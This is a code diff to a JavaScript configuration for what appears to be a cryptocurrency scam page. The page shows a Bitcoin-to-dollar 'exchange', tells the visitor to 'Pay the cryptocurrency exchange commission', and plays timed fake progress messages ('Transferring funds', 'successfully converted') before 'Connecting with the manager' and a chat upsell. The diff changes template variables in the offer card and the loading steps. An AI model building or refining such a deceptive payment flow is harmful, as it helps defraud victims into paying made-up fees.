@@ -5241,7 +5241,7 @@
                     b: 2000,
                     p: 2000
                 },
-                customItem: '<div class="align-items-center justify-content-center row text-center" style="margin-bottom: 20px;"> <div class="col-sm my-auto"> <label style="padding: 10px;border-radius: 10px;border: 2px double #0094be;color: #0093c0;"><b>Give  <span class="text-numbers">{{moneyBTC}}</span></b></label> </div><div><div class="bit-lang-g-icon col-sm obmenbtc"></div></div><div class="col-sm my-auto"> <label style="padding: 10px;border-radius: 10px;border: 2px double #0094be;color: #0093c0;"><b>Receive <span class="text-numbers">{{convertedAmountUSD}}</span></b> </label> </div></div>',
+                customItem: '<div class="align-items-center justify-content-center row text-center" style="margin-bottom: 20px;"> <div class="col-sm my-auto"> <label style="padding: 10px;border-radius: 10px;border: 2px double #0094be;color: #0093c0;"><b>Give  <span class="text-numbers">{{moneyBTC}}</span></b></label> </div><div><div class="bit-lang-g-icon col-sm obmenbtc"></div></div><div class="col-sm my-auto"> <label style="padding: 10px;border-radius: 10px;border: 2px double #0094be;color: #0093c0;"><b>Receive <span class="text-numbers">{{moneyPageBased}}</span></b> </label> </div></div>',
                 instructions: ['Click the button "Exchange BTC to USD"', "Pay the cryptocurrency exchange commission", "Receive your funds in dollars"],
                 buttonText: 'Exchange BTC to USD',
                 paymentLink: "/account/exchange?s=gd260ca58",
@@ -5257,7 +5257,7 @@
                 name: "manager and receipt",
                 loadtime: 13,
                 isLoading: !0,
-                loadsteps: ['Transferring funds from BTC to <span class="text-uppercase">{{converting_geoCur}}</span>', 'Your funds have been successfully converted to <span class="text-uppercase">{{converting_geoCur}}</span>', "Connecting with the manager"],
+                loadsteps: ['Transferring funds from BTC to USD', 'Your funds have been successfully converted to USD', "Connecting with the manager"],
                 statusMessage: "Currency conversion completed successfully!",
                 upsellType: "chat",
                 chat: {
